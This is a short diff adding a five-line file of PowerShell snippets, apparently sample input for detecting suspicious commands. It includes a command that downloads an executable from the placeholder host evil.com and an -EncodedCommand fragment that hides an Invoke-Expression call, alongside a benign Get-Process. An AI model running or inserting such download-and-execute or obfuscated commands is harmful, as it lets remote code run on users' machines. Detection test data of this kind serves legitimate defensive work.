@@ -1,0 +1,5 @@
+Invoke-WebRequest https://evil.com/a.exe
+
+Get-Process
+
+-EncodedCommand SQBFAFgA
